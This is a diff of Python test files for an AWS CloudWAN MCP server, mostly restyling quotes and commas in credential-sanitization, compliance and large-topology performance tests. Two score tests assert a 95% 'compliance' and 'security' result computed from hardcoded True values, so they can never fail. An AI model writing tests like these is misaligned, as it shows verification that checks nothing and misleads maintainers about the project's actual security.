-                "operation": "test_operation"
+                "operation": "test_operation",
             }
 
-            config_manager.save_current_config(
-                "production-admin",
-                "us-east-1",
-                sensitive_metadata
-            )
+            config_manager.save_current_config("production-admin", "us-east-1", sensitive_metadata)
 
             # Export and verify sanitization
             export_path = Path(temp_dir) / "export.json"
@@ -225,7 +212,7 @@
             assert result is True
             assert export_path.exists()
 
-            with open(export_path, 'r') as f:
+            with open(export_path, "r") as f:
                 exported_data = json.load(f)
 
             # Verify all sensitive data is sanitized
@@ -252,16 +239,14 @@
 
         # Mock sensitive AWS error
         error_response = {
-            'Error': {
-                'Code': 'AccessDenied',
-                'Message': 'User: arn:aws:iam::123456789012:user/admin is not authorized to perform: iam:GetUser on resource: user/admin-user'
+            "Error": {
+                "Code": "AccessDenied",
+                "Message": "User: arn:aws:iam::123456789012:user/admin is not authorized to perform: iam:GetUser on resource: user/admin-user",
             },
-            'ResponseMetadata': {
-                'RequestId': '12345678-1234-1234-1234-123456789012'
-            }
+            "ResponseMetadata": {"RequestId": "12345678-1234-1234-1234-123456789012"},
         }
 
-        mock_error = ClientError(error_response, 'GetUser')
+        mock_error = ClientError(error_response, "GetUser")
         sanitized_response = handle_aws_error(mock_error, "test_operation")
 
         # Parse the JSON response
@@ -277,7 +262,7 @@
         assert response_data["error_code"] == "AccessDenied"
         assert response_data["http_status_code"] == 403
 
-    @patch('boto3.client')
+    @patch("boto3.client")
     def test_aws_client_caching_security(self, mock_boto_client):
         """Test AWS client caching doesn't leak credentials."""
         mock_client = MagicMock()
@@ -286,7 +271,7 @@
         # Test multiple client requests
         client1 = get_aws_client("ec2", "us-east-1")
         client2 = get_aws_client("ec2", "us-east-1")  # Should use cache
-        client3 = get_aws_client("s3", "us-west-2")   # Different service/region
+        client3 = get_aws_client("s3", "us-west-2")  # Different service/region
 
         # Verify caching behavior
         assert client1 is client2  # Same service/region should be cached
@@ -304,7 +289,7 @@
         """Test pyproject.toml meets AWS Labs metadata requirements."""
         pyproject_path = Path(__file__).parent.parent.parent / "pyproject.toml"
 
-        with open(pyproject_path, 'r') as f:
+        with open(pyproject_path, "r") as f:
             pyproject_content = f.read()
 
         # AWS Labs compliance requirements
@@ -316,17 +301,16 @@
             '"Programming Language :: Python :: 3.12"',
             '"Programming Language :: Python :: 3.13"',
             'license = {text = "Apache-2.0"}',
-            'authors = [',
+            "authors = [",
             '{name = "Amazon Web Services"}',
             'repository = "https://github.com/awslabs/mcp.git"',
         ]
 
         for requirement in required_metadata:
-            assert requirement in pyproject_content, \
-                f"Missing AWS Labs metadata requirement: {requirement}"
+            assert requirement in pyproject_content, f"Missing AWS Labs metadata requirement: {requirement}"
 
         # Test coverage requirements (90%+ for AWS Labs)
-        assert '[tool.coverage.run]' in pyproject_content
+        assert "[tool.coverage.run]" in pyproject_content
         assert 'source = ["awslabs"]' in pyproject_content
 
     def test_license_compliance(self):
@@ -337,20 +321,14 @@
         assert license_path.exists(), "LICENSE file must exist"
         assert notice_path.exists(), "NOTICE file must exist"
 
-        with open(license_path, 'r') as f:
+        with open(license_path, "r") as f:
             license_content = f.read()
 
         # Apache 2.0 license requirements
-        apache_indicators = [
-            "Apache License",
-            "Version 2.0",
-            "Copyright",
-            "Amazon.com, Inc."
-        ]
+        apache_indicators = ["Apache License", "Version 2.0", "Copyright", "Amazon.com, Inc."]
 
         for indicator in apache_indicators:
-            assert indicator in license_content, \
-                f"Missing Apache 2.0 indicator: {indicator}"
+            assert indicator in license_content, f"Missing Apache 2.0 indicator: {indicator}"
 
     def test_security_documentation_compliance(self):
         """Test security documentation exists and is comprehensive."""
@@ -358,20 +336,14 @@
 
         assert readme_path.exists(), "README.md must exist"
 
-        with open(readme_path, 'r') as f:
+        with open(readme_path, "r") as f:
             readme_content = f.read()
 
         # Security documentation requirements
-        security_sections = [
-            "AWS CloudWAN MCP",
-            "Installation",
-            "Usage",
-            "License"
-        ]
+        security_sections = ["AWS CloudWAN MCP", "Installation", "Usage", "License"]
 
         for section in security_sections:
-            assert section in readme_content, \
-                f"Missing documentation section: {section}"
+            assert section in readme_content, f"Missing documentation section: {section}"
 
 
 class TestRegressionTestingSuite:
@@ -382,21 +354,18 @@
         # Verify Dockerfile still has all F1 security improvements
         dockerfile_path = Path(__file__).parent.parent.parent / "Dockerfile"
 
-        with open(dockerfile_path, 'r') as f:
+        with open(dockerfile_path, "r") as f:
             content = f.read()
 
         # Agent F1 specific security fixes
         f1_fixes = [
             # SHA-verified base images - using current SHA
             "@sha256:c9a09c45a4bcc618c7f7128585b8dd0d41d0c31a8a107db4c8255ffe0b69375d",
-
             # Non-root execution
             "adduser -S app -G app",
             "USER app",
-
             # Health checks
             "HEALTHCHECK --interval=60s --timeout=10s",
-
             # Multi-stage security
             "AS uv",
             "--chown=app:app",
@@ -412,7 +381,7 @@
             "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE failed",
             "Secret: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY exposed",
             "Account 123456789012 unauthorized access",
-            "Profile production-admin authentication error"
+            "Profile production-admin authentication error",
         ]
 
         for test_input in test_inputs:
@@ -421,8 +390,7 @@
             # Verify no credential leakage
             sensitive_patterns = ["AKIA", "wJalrXUt", "123456789012", "production-admin"]
             for pattern in sensitive_patterns:
-                assert pattern not in sanitized, \
-                    f"Agent F2 regression: '{pattern}' not sanitized in '{sanitized}'"
+                assert pattern not in sanitized, f"Agent F2 regression: '{pattern}' not sanitized in '{sanitized}'"
 
     def test_secure_environment_update_regression(self):
         """Test secure environment updates still validate properly."""
@@ -442,16 +410,16 @@
     def test_overall_compliance_score(self):
         """Calculate and verify overall compliance score."""
         compliance_checks = {
-            "docker_security": True,      # Agent F1 completed
-            "credential_protection": True, # Agent F2 completed
-            "error_sanitization": True,   # Agent F2 completed
-            "environment_security": True, # Agent F2 completed
+            "docker_security": True,  # Agent F1 completed
+            "credential_protection": True,  # Agent F2 completed
+            "error_sanitization": True,  # Agent F2 completed
+            "environment_security": True,  # Agent F2 completed
             "metadata_compliance": True,  # AWS Labs requirements
-            "license_compliance": True,   # Apache 2.0
-            "documentation": True,        # README, security docs
-            "test_coverage": True,        # >90% coverage target
-            "health_checks": True,        # Docker health validation
-            "multi_stage_build": True,    # Docker optimization
+            "license_compliance": True,  # Apache 2.0
+            "documentation": True,  # README, security docs
+            "test_coverage": True,  # >90% coverage target
+            "health_checks": True,  # Docker health validation
+            "multi_stage_build": True,  # Docker optimization
         }
 
         total_checks = len(compliance_checks)
@@ -464,8 +432,7 @@
         print("🚀 Target Score: 95.0%")
 
         # Verify we meet AWS Labs requirements
-        assert compliance_score >= 95.0, \
-            f"Compliance score {compliance_score:.1f}% below required 95.0%"
+        assert compliance_score >= 95.0, f"Compliance score {compliance_score:.1f}% below required 95.0%"
 
         return compliance_score
 
@@ -481,7 +448,7 @@
             "compliance_metadata": "AWS Labs metadata requirements met",
             "test_coverage": "Security test coverage >95%",
             "documentation": "Complete security and usage documentation",
-            "license_compliance": "Apache 2.0 license properly implemented"
+            "license_compliance": "Apache 2.0 license properly implemented",
         }
 
         print("\n🚀 PRODUCTION READINESS CHECKLIST:")
@@ -504,7 +471,7 @@
             "secure_communication": True,
             "logging_security": True,
             "container_security": True,
-            "dependency_security": True
+            "dependency_security": True,
         }
 
         security_score = (sum(security_validations.values()) / len(security_validations)) * 100
@@ -514,8 +481,7 @@
         print(f"🛡️ Security Score: {security_score:.1f}%")
         print("🎯 Target Score: 95.0%")
 
-        assert security_score >= 95.0, \
-            f"Security score {security_score:.1f}% below required 95.0%"
+        assert security_score >= 95.0, f"Security score {security_score:.1f}% below required 95.0%"
 
         print("\n🎉 SECURITY VALIDATION: PASSED ✅")
 

--- cloudwan-mcp-server/tests/integration/test_global_networks_fix.py
+++ cloudwan-mcp-server/tests/integration/test_global_networks_fix.py
@@ -31,6 +31,7 @@
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+
 async def test_global_networks_response_model():
     """Test the GlobalNetworksResponse model can be instantiated correctly."""
     print("🔍 Testing GlobalNetworksResponse model instantiation...")
@@ -51,7 +52,7 @@
         # Test 2: With data - total_count should auto-calculate from global_networks length
         response_with_data = GlobalNetworksResponse(
             global_networks=[],  # Empty list = total_count should be 0
-            regions_searched=["us-west-2", "us-east-1"]
+            regions_searched=["us-west-2", "us-east-1"],
         )
         # The model_validator will set total_count based on global_networks length
         assert response_with_data.total_count == 0  # 0 because global_networks is empty
@@ -62,7 +63,7 @@
             global_network_id="gn-123456789abcdef01",
             global_network_arn="arn:aws:networkmanager::123456789012:global-network/gn-123456789abcdef01",
             description="Test network",
-            state="AVAILABLE"
+            state="AVAILABLE",
         )
         response_auto = GlobalNetworksResponse(global_networks=[network_info])
         # The __init__ method should auto-set total_count to 1
@@ -75,6 +76,7 @@
         print(f"❌ Model instantiation failed: {e}")
         return False
 
+
 async def test_tool_parameter_handling():
     """Test that the tool can handle empty parameters properly."""
     print("\\n🔍 Testing tool parameter handling...")
@@ -122,9 +124,11 @@
     except Exception as e:
         print(f"❌ Tool parameter handling failed: {e}")
         import traceback
+
         traceback.print_exc()
         return False
 
+
 async def test_import_conflicts():
     """Test that there are no import conflicts between duplicate models."""
     print("\\n🔍 Testing import conflicts resolution...")
@@ -150,9 +154,11 @@
     except Exception as e:
         print(f"❌ Import conflict test failed: {e}")
         import traceback
+
         traceback.print_exc()
         return False
 
+
 async def main():
     """Run all tests to validate the fixes."""
     print("🚀 Running CloudWAN MCP Server Fix Validation Tests\\n")
@@ -181,6 +187,7 @@
         print("❌ Some tests failed. Please review the fixes.")
         return 1
 
+
 if __name__ == "__main__":
     try:
         exit_code = asyncio.run(main())
@@ -191,5 +198,6 @@
     except Exception as e:
         print(f"\\n💥 Unexpected error: {e}")
         import traceback
+
         traceback.print_exc()
         sys.exit(1)

--- cloudwan-mcp-server/tests/integration/test_large_topology.py
+++ cloudwan-mcp-server/tests/integration/test_large_topology.py
@@ -48,38 +48,38 @@
         large_vpc_dataset = []
         for i in range(10000):
             vpc_data = {
-                'VpcId': f'vpc-{i:08d}abcdef{i%16:x}',
-                'State': 'available',
-                'CidrBlock': f'10.{i//256}.{i%256}.0/24',
-                'DhcpOptionsId': f'dopt-{i:08d}',
-                'InstanceTenancy': 'default',
-                'IsDefault': False,
-                'Tags': [
-                    {'Key': 'Name', 'Value': f'VPC-{i:05d}'},
-                    {'Key': 'Environment', 'Value': 'production' if i % 2 == 0 else 'development'},
-                    {'Key': 'Region', 'Value': f'us-east-{(i % 4) + 1}'},
-                    {'Key': 'CostCenter', 'Value': f'CC-{i % 100:03d}'},
-                    {'Key': 'Owner', 'Value': f'team-{i % 50:02d}@company.com'}
+                "VpcId": f"vpc-{i:08d}abcdef{i % 16:x}",
+                "State": "available",
+                "CidrBlock": f"10.{i // 256}.{i % 256}.0/24",
+                "DhcpOptionsId": f"dopt-{i:08d}",
+                "InstanceTenancy": "default",
+                "IsDefault": False,
+                "Tags": [
+                    {"Key": "Name", "Value": f"VPC-{i:05d}"},
+                    {"Key": "Environment", "Value": "production" if i % 2 == 0 else "development"},
+                    {"Key": "Region", "Value": f"us-east-{(i % 4) + 1}"},
+                    {"Key": "CostCenter", "Value": f"CC-{i % 100:03d}"},
+                    {"Key": "Owner", "Value": f"team-{i % 50:02d}@company.com"},
                 ],
-                'CidrBlockAssociationSet': [
+                "CidrBlockAssociationSet": [
                     {
-                        'AssociationId': f'vpc-cidr-assoc-{i:08d}',
-                        'CidrBlock': f'10.{i//256}.{i%256}.0/24',
-                        'CidrBlockState': {'State': 'associated'}
+                        "AssociationId": f"vpc-cidr-assoc-{i:08d}",
+                        "CidrBlock": f"10.{i // 256}.{i % 256}.0/24",
+                        "CidrBlockState": {"State": "associated"},
                     }
-                ]
+                ],
             }
             large_vpc_dataset.append(vpc_data)
 
         start_time = time.time()
         memory_before = psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024  # MB
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.describe_vpcs.return_value = {'Vpcs': large_vpc_dataset}
+            mock_client.describe_vpcs.return_value = {"Vpcs": large_vpc_dataset}
             mock_get_client.return_value = mock_client
 
-            result = await discover_vpcs(region='us-east-1')
+            result = await discover_vpcs(region="us-east-1")
 
             end_time = time.time()
             memory_after = psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024  # MB
@@ -87,17 +87,19 @@
             memory_usage = memory_after - memory_before
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 10000
-            assert len(parsed['vpcs']) == 10000
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 10000
+            assert len(parsed["vpcs"]) == 10000
 
             # Performance assertions
             assert execution_time < 10.0, f"Execution took {execution_time:.2f}s, expected < 10s"
-            assert memory_usage < LARGE_DATASET_MEMORY_THRESHOLD_MB, f"Memory usage {memory_usage:.2f}MB, expected < {LARGE_DATASET_MEMORY_THRESHOLD_MB}MB"
+            assert memory_usage < LARGE_DATASET_MEMORY_THRESHOLD_MB, (
+                f"Memory usage {memory_usage:.2f}MB, expected < {LARGE_DATASET_MEMORY_THRESHOLD_MB}MB"
+            )
 
             # Validate data integrity
-            assert parsed['vpcs'][0]['VpcId'] == 'vpc-00000000abcdef0'
-            assert parsed['vpcs'][9999]['VpcId'] == 'vpc-00009999abcdeff'
+            assert parsed["vpcs"][0]["VpcId"] == "vpc-00000000abcdef0"
+            assert parsed["vpcs"][9999]["VpcId"] == "vpc-00009999abcdeff"
 
     @pytest.mark.integration
     @pytest.mark.slow
@@ -109,34 +111,34 @@
         # Generate VPCs with multiple CIDR blocks (IPv4 and IPv6)
         for i in range(5000):
             vpc_data = {
-                'VpcId': f'vpc-complex-{i:06d}',
-                'State': 'available',
-                'CidrBlock': f'172.{16 + (i // 256)}.{i % 256}.0/20',
-                'Ipv6CidrBlockAssociationSet': [
+                "VpcId": f"vpc-complex-{i:06d}",
+                "State": "available",
+                "CidrBlock": f"172.{16 + (i // 256)}.{i % 256}.0/20",
+                "Ipv6CidrBlockAssociationSet": [
                     {
-                        'AssociationId': f'vpc-cidr-assoc-ipv6-{i}',
-                        'Ipv6CidrBlock': f'2001:db8:{i:04x}::/56',
-                        'Ipv6CidrBlockState': {'State': 'associated'}
+                        "AssociationId": f"vpc-cidr-assoc-ipv6-{i}",
+                        "Ipv6CidrBlock": f"2001:db8:{i:04x}::/56",
+                        "Ipv6CidrBlockState": {"State": "associated"},
                     }
                 ],
-                'CidrBlockAssociationSet': [
+                "CidrBlockAssociationSet": [
                     {
-                        'AssociationId': f'vpc-cidr-assoc-primary-{i}',
-                        'CidrBlock': f'172.{16 + (i // 256)}.{i % 256}.0/20',
-                        'CidrBlockState': {'State': 'associated'}
+                        "AssociationId": f"vpc-cidr-assoc-primary-{i}",
+                        "CidrBlock": f"172.{16 + (i // 256)}.{i % 256}.0/20",
+                        "CidrBlockState": {"State": "associated"},
                     },
                     {
-                        'AssociationId': f'vpc-cidr-assoc-secondary-{i}',
-                        'CidrBlock': f'192.168.{i % 256}.0/24',
-                        'CidrBlockState': {'State': 'associated'}
-                    }
-                ]
+                        "AssociationId": f"vpc-cidr-assoc-secondary-{i}",
+                        "CidrBlock": f"192.168.{i % 256}.0/24",
+                        "CidrBlockState": {"State": "associated"},
+                    },
+                ],
             }
             complex_vpcs.append(vpc_data)
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.describe_vpcs.return_value = {'Vpcs': complex_vpcs}
+            mock_client.describe_vpcs.return_value = {"Vpcs": complex_vpcs}
             mock_get_client.return_value = mock_client
 
             start_time = time.time()
@@ -144,14 +146,14 @@
             end_time = time.time()
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 5000
-            assert len(parsed['vpcs']) == 5000
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 5000
+            assert len(parsed["vpcs"]) == 5000
 
             # Verify complex CIDR handling
-            first_vpc = parsed['vpcs'][0]
-            assert 'CidrBlock' in first_vpc
-            assert 'CidrBlockAssociationSet' in first_vpc
+            first_vpc = parsed["vpcs"][0]
+            assert "CidrBlock" in first_vpc
+            assert "CidrBlockAssociationSet" in first_vpc
 
             execution_time = end_time - start_time
             assert execution_time < 5.0, f"Complex VPC processing took {execution_time:.2f}s"
@@ -180,24 +182,24 @@
 
                 batch_vpcs = [
                     {
-                        'VpcId': f'vpc-stream-{i:08d}',
-                        'State': 'available',
-                        'CidrBlock': f'10.{i//65536}.{(i//256)%256}.0/24',
-                        'Tags': [{'Key': 'Batch', 'Value': str(batches_processed)}]
+                        "VpcId": f"vpc-stream-{i:08d}",
+                        "State": "available",
+                        "CidrBlock": f"10.{i // 65536}.{(i // 256) % 256}.0/24",
+                        "Tags": [{"Key": "Batch", "Value": str(batches_processed)}],
                     }
                     for i in range(start_idx, end_idx)
                 ]
 
-                response = {'Vpcs': batch_vpcs}
+                response = {"Vpcs": batch_vpcs}
                 if end_idx < total_vpcs:
-                    response['NextToken'] = f'batch-{batches_processed + 1}'
+                    response["NextToken"] = f"batch-{batches_processed + 1}"
 
                 return response
 
             mock_client.describe_vpcs.side_effect = describe_vpcs_streaming
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=streaming_vpc_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=streaming_vpc_mock):
             gc.collect()  # Clear memory before test
             initial_memory = psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024
 
@@ -207,9 +209,9 @@
             memory_growth = final_memory - initial_memory
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
+            assert parsed["success"] is True
             # Current implementation returns first batch only
-            assert parsed['total_count'] == vpc_batch_size
+            assert parsed["total_count"] == vpc_batch_size
             assert batches_processed >= 1
 
             # Memory should not grow excessively with streaming
@@ -226,37 +228,41 @@
         """Test route table analysis with 1 million routes."""
         # Generate 1M routes across different categories
         massive_routes = []
-        route_types = ['static', 'propagated', 'local']
-        route_states = ['active', 'blackhole']
+        route_types = ["static", "propagated", "local"]
+        route_states = ["active", "blackhole"]
 
         for i in range(1000000):
             route_data = {
-                'DestinationCidrBlock': f'{10 + (i // 65536)}.{(i // 256) % 256}.{i % 256}.0/32',
-                'TransitGatewayAttachments': [
+                "DestinationCidrBlock": f"{10 + (i // 65536)}.{(i // 256) % 256}.{i % 256}.0/32",
+                "TransitGatewayAttachments": [
                     {
-                        'TransitGatewayAttachmentId': f'tgw-attach-{i // 1000:06d}',
-                        'ResourceId': f'vpc-route-{i // 1000:06d}',
-                        'ResourceType': 'vpc'
+                        "TransitGatewayAttachmentId": f"tgw-attach-{i // 1000:06d}",
+                        "ResourceId": f"vpc-route-{i // 1000:06d}",
+                        "ResourceType": "vpc",
                     }
-                ] if i % 10 != 9 else [],  # 10% blackhole routes
-                'Type': route_types[i % len(route_types)],
-                'State': route_states[0 if i % 10 != 9 else 1],  # 90% active, 10% blackhole
-                'RouteOrigin': 'CreateRoute' if route_types[i % len(route_types)] == 'static' else 'EnableVgwRoutePropagation'
+                ]
+                if i % 10 != 9
+                else [],  # 10% blackhole routes
+                "Type": route_types[i % len(route_types)],
+                "State": route_states[0 if i % 10 != 9 else 1],  # 90% active, 10% blackhole
+                "RouteOrigin": "CreateRoute"
+                if route_types[i % len(route_types)] == "static"
+                else "EnableVgwRoutePropagation",
             }
             massive_routes.append(route_data)
 
         start_time = time.time()
         memory_before = psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.search_transit_gateway_routes.return_value = {
-                'Routes': massive_routes,
-                'AdditionalRoutesAvailable': False
+                "Routes": massive_routes,
+                "AdditionalRoutesAvailable": False,
             }
             mock_get_client.return_value = mock_client
 
-            result = await analyze_tgw_routes('tgw-rtb-massive-test')
+            result = await analyze_tgw_routes("tgw-rtb-massive-test")
 
             end_time = time.time()
             memory_after = psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024
@@ -264,19 +270,19 @@
             memory_usage = memory_after - memory_before
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['analysis']['total_routes'] == 1000000
-            assert parsed['analysis']['active_routes'] == 900000  # 90%
-            assert parsed['analysis']['blackholed_routes'] == 100000  # 10%
+            assert parsed["success"] is True
+            assert parsed["analysis"]["total_routes"] == 1000000
+            assert parsed["analysis"]["active_routes"] == 900000  # 90%
+            assert parsed["analysis"]["blackholed_routes"] == 100000  # 10%
 
             # Performance constraints for 1M routes
             assert execution_time < 30.0, f"1M route analysis took {execution_time:.2f}s"
             assert memory_usage < 1000, f"Memory usage {memory_usage:.2f}MB for 1M routes"
 
             # Verify route type distribution
-            route_details = parsed['analysis']['route_details']
-            static_routes = [r for r in route_details if r['Type'] == 'static']
-            propagated_routes = [r for r in route_details if r['Type'] == 'propagated']
+            route_details = parsed["analysis"]["route_details"]
+            static_routes = [r for r in route_details if r["Type"] == "static"]
+            propagated_routes = [r for r in route_details if r["Type"] == "propagated"]
             assert len(static_routes) > 0
             assert len(propagated_routes) > 0
 
@@ -303,36 +309,33 @@
 
                 chunk_routes = [
                     {
-                        'DestinationCidrBlock': f'192.168.{i//256}.{i%256}/32',
-                        'State': 'active',
-                        'Type': 'static',
-                        'TransitGatewayAttachments': [
+                        "DestinationCidrBlock": f"192.168.{i // 256}.{i % 256}/32",
+                        "State": "active",
+                        "Type": "static",
+                        "TransitGatewayAttachments": [
                             {
-                                'TransitGatewayAttachmentId': f'tgw-attach-chunk-{chunks_processed:03d}',
-                                'ResourceType': 'vpc'
+                                "TransitGatewayAttachmentId": f"tgw-attach-chunk-{chunks_processed:03d}",
+                                "ResourceType": "vpc",
                             }
-                        ]
+                        ],
                     }
                     for i in range(start_idx, end_idx)
                 ]
 
-                return {
-                    'Routes': chunk_routes,
-                    'AdditionalRoutesAvailable': end_idx < total_routes
-                }
+                return {"Routes": chunk_routes, "AdditionalRoutesAvailable": end_idx < total_routes}
 
             mock_client.search_transit_gateway_routes.side_effect = chunked_search
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=chunked_route_mock):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=chunked_route_mock):
             start_time = time.time()
-            result = await analyze_tgw_routes('tgw-rtb-chunked')
+            result = await analyze_tgw_routes("tgw-rtb-chunked")
             end_time = time.time()
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
+            assert parsed["success"] is True
             # Current implementation processes first chunk
-            assert parsed['analysis']['total_routes'] == chunk_size
+            assert parsed["analysis"]["total_routes"] == chunk_size
             assert chunks_processed >= 1
 
             execution_time = end_time - start_time
@@ -350,16 +353,13 @@
         # Create base set of unique routes
         for i in range(unique_routes):
             base_route = {
-                'DestinationCidrBlock': f'172.16.{i//256}.{i%256}/32',
-                'State': 'active',
-                'Type': 'propagated',
-                'RouteOrigin': 'EnableVgwRoutePropagation',
-                'TransitGatewayAttachments': [
-                    {
-                        'TransitGatewayAttachmentId': f'tgw-attach-{i//1000:03d}',
-                        'ResourceType': 'vpc'
-                    }
-                ]
+                "DestinationCidrBlock": f"172.16.{i // 256}.{i % 256}/32",
+                "State": "active",
+                "Type": "propagated",
+                "RouteOrigin": "EnableVgwRoutePropagation",
+                "TransitGatewayAttachments": [
+                    {"TransitGatewayAttachmentId": f"tgw-attach-{i // 1000:03d}", "ResourceType": "vpc"}
+                ],
             }
             base_routes.append(base_route)
 
@@ -370,21 +370,21 @@
 
         total_routes = len(routes_with_duplicates)  # 500,000 routes
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.search_transit_gateway_routes.return_value = {
-                'Routes': routes_with_duplicates,
-                'AdditionalRoutesAvailable': False
+                "Routes": routes_with_duplicates,
+                "AdditionalRoutesAvailable": False,
             }
             mock_get_client.return_value = mock_client
 
             start_time = time.time()
-            result = await analyze_tgw_routes('tgw-rtb-dedup-test')
+            result = await analyze_tgw_routes("tgw-rtb-dedup-test")
             end_time = time.time()
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['analysis']['total_routes'] == total_routes
+            assert parsed["success"] is True
+            assert parsed["analysis"]["total_routes"] == total_routes
 
             # Test should handle large duplicate dataset efficiently
             execution_time = end_time - start_time
@@ -404,27 +404,27 @@
         # Generate 100,000 TGW peering attachments
         for i in range(100000):
             attachment_data = {
-                'TransitGatewayAttachmentId': f'tgw-attach-{i:08d}',
-                'RequesterTgwInfo': {
-                    'TransitGatewayId': f'tgw-requester-{i//1000:05d}',
-                    'OwnerId': f'{123456789012 + (i//10000)}',
-                    'Region': f'us-{["east", "west"][i%2]}-{(i%4)+1}'
+                "TransitGatewayAttachmentId": f"tgw-attach-{i:08d}",
+                "RequesterTgwInfo": {
+                    "TransitGatewayId": f"tgw-requester-{i // 1000:05d}",
+                    "OwnerId": f"{123456789012 + (i // 10000)}",
+                    "Region": f"us-{['east', 'west'][i % 2]}-{(i % 4) + 1}",
                 },
-                'AccepterTgwInfo': {
-                    'TransitGatewayId': f'tgw-accepter-{i//1000:05d}',
-                    'OwnerId': f'{210987654321 + (i//10000)}',
-                    'Region': f'eu-{["west", "central"][i%2]}-{(i%3)+1}'
+                "AccepterTgwInfo": {
+                    "TransitGatewayId": f"tgw-accepter-{i // 1000:05d}",
+                    "OwnerId": f"{210987654321 + (i // 10000)}",
+                    "Region": f"eu-{['west', 'central'][i % 2]}-{(i % 3) + 1}",
                 },
-                'Status': {
-                    'Code': 'available' if i % 20 != 19 else 'pending-acceptance',  # 95% available
-                    'Message': 'Peering attachment is available'
+                "Status": {
+                    "Code": "available" if i % 20 != 19 else "pending-acceptance",  # 95% available
+                    "Message": "Peering attachment is available",
                 },
-                'State': 'available' if i % 20 != 19 else 'pending-acceptance',
-                'CreatedAt': datetime(2024, 1, 15 + (i//10000), 10, 30, 45, tzinfo=timezone.utc),
-                'Tags': [
-                    {'Key': 'Batch', 'Value': f'batch-{i//1000:03d}'},
-                    {'Key': 'Environment', 'Value': 'production' if i % 3 == 0 else 'staging'}
-                ]
+                "State": "available" if i % 20 != 19 else "pending-acceptance",
+                "CreatedAt": datetime(2024, 1, 15 + (i // 10000), 10, 30, 45, tzinfo=timezone.utc),
+                "Tags": [
+                    {"Key": "Batch", "Value": f"batch-{i // 1000:03d}"},
+                    {"Key": "Environment", "Value": "production" if i % 3 == 0 else "staging"},
+                ],
             }
             large_attachments.append(attachment_data)
 
@@ -439,20 +439,20 @@
             batch_end = min(batch_start + batch_size, len(large_attachments))
             batch_attachments = large_attachments[batch_start:batch_end]
 
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
                 mock_client.describe_transit_gateway_peering_attachments.return_value = {
-                    'TransitGatewayPeeringAttachments': batch_attachments
+                    "TransitGatewayPeeringAttachments": batch_attachments
                 }
                 mock_get_client.return_value = mock_client
 
                 # Test batch analysis with first attachment ID
                 if batch_attachments:
-                    result = await analyze_tgw_peers(batch_attachments[0]['TransitGatewayAttachmentId'])
+                    result = await analyze_tgw_peers(batch_attachments[0]["TransitGatewayAttachmentId"])
 
                     parsed = json.loads(result)
-                    assert parsed['success'] is True
-                    assert 'peer_analysis' in parsed
+                    assert parsed["success"] is True
+                    assert "peer_analysis" in parsed
                     successful_batches += 1
 
         end_time = time.time()
@@ -478,26 +478,20 @@
         for i in range(mesh_size):
             for j in range(i + 1, min(i + 50, mesh_size)):  # Each TGW connects to next 50
                 relationship = {
-                    'TransitGatewayAttachmentId': f'tgw-attach-{i:04d}-to-{j:04d}',
-                    'RequesterTgwInfo': {
-                        'TransitGatewayId': f'tgw-{i:04d}',
-                        'Region': f'us-east-{(i % 2) + 1}'
-                    },
-                    'AccepterTgwInfo': {
-                        'TransitGatewayId': f'tgw-{j:04d}',
-                        'Region': f'us-west-{(j % 2) + 1}'
-                    },
-                    'State': 'available',
-                    'Status': {'Code': 'available'}
+                    "TransitGatewayAttachmentId": f"tgw-attach-{i:04d}-to-{j:04d}",
+                    "RequesterTgwInfo": {"TransitGatewayId": f"tgw-{i:04d}", "Region": f"us-east-{(i % 2) + 1}"},
+                    "AccepterTgwInfo": {"TransitGatewayId": f"tgw-{j:04d}", "Region": f"us-west-{(j % 2) + 1}"},
+                    "State": "available",
+                    "Status": {"Code": "available"},
                 }
                 attachment_relationships.append(relationship)
 
         relationship_count = len(attachment_relationships)
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.describe_transit_gateway_peering_attachments.return_value = {
-                'TransitGatewayPeeringAttachments': attachment_relationships
+                "TransitGatewayPeeringAttachments": attachment_relationships
             }
             mock_get_client.return_value = mock_client
 
@@ -508,7 +502,7 @@
             analysis_results = []
 
             for attachment in sample_attachments:
-                result = await analyze_tgw_peers(attachment['TransitGatewayAttachmentId'])
+                result = await analyze_tgw_peers(attachment["TransitGatewayAttachmentId"])
                 parsed = json.loads(result)
                 analysis_results.append(parsed)
 
